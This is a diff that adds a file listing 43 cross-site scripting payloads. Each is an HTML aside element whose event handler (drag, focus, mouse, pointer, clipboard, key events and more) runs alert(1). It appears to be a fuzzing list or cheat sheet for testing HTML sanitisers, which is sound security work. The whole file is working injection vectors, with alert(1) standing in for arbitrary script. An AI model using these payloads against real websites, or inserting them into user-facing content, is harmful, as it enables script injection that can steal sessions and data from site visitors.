@@ -1,0 +1,43 @@
+<aside draggable="true" ondrag="alert(1)">test</aside>
+<aside draggable="true" ondragend="alert(1)">test</aside>
+<aside draggable="true" ondragenter="alert(1)">test</aside>
+<aside draggable="true" ondragleave="alert(1)">test</aside>
+<aside draggable="true" ondragstart="alert(1)">test</aside>
+<aside id=x tabindex=1 onactivate=alert(1)></aside>
+<aside id=x tabindex=1 onbeforeactivate=alert(1)></aside>
+<aside id=x tabindex=1 onbeforedeactivate=alert(1)></aside><input autofocus>
+<aside id=x tabindex=1 ondeactivate=alert(1)></aside><input id=y autofocus>
+<aside id=x tabindex=1 onfocus=alert(1)></aside>
+<aside id=x tabindex=1 onfocusin=alert(1)></aside>
+<aside onafterscriptexecute=alert(1)><script>1</script>
+<aside onbeforecopy="alert(1)" contenteditable>test</aside>
+<aside onbeforecut="alert(1)" contenteditable>test</aside>
+<aside onbeforepaste="alert(1)" contenteditable>test</aside>
+<aside onbeforescriptexecute=alert(1)><script>1</script>
+<aside onblur=alert(1) tabindex=1 id=x></aside><input autofocus>
+<aside onclick="alert(1)">test</aside>
+<aside oncontextmenu="alert(1)">test</aside>
+<aside oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<aside oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<aside ondblclick="alert(1)" autofocus tabindex=1>test</aside>
+<aside onfocusout=alert(1) tabindex=1 id=x></aside><input autofocus>
+<aside onkeydown="alert(1)" contenteditable>test</aside>
+<aside onkeypress="alert(1)" contenteditable>test</aside>
+<aside onkeyup="alert(1)" contenteditable>test</aside>
+<aside onmousedown="alert(1)">test</aside>
+<aside onmouseenter="alert(1)">test</aside>
+<aside onmouseleave="alert(1)">test</aside>
+<aside onmousemove="alert(1)">test</aside>
+<aside onmouseout="alert(1)">test</aside>
+<aside onmouseover="alert(1)">test</aside>
+<aside onmouseup="alert(1)">test</aside>
+<aside onmousewheel=alert(1)>requires scrolling
+<aside onpaste="alert(1)" contenteditable>test</aside>
+<aside onpointerdown=alert(1)>XSS</aside>
+<aside onpointerenter=alert(1)>XSS</aside>
+<aside onpointerleave=alert(1)>XSS</aside>
+<aside onpointermove=alert(1)>XSS</aside>
+<aside onpointerout=alert(1)>XSS</aside>
+<aside onpointerover=alert(1)>XSS</aside>
+<aside onpointerrawupdate=alert(1)>XSS</aside>
+<aside onpointerup=alert(1)>XSS</aside>
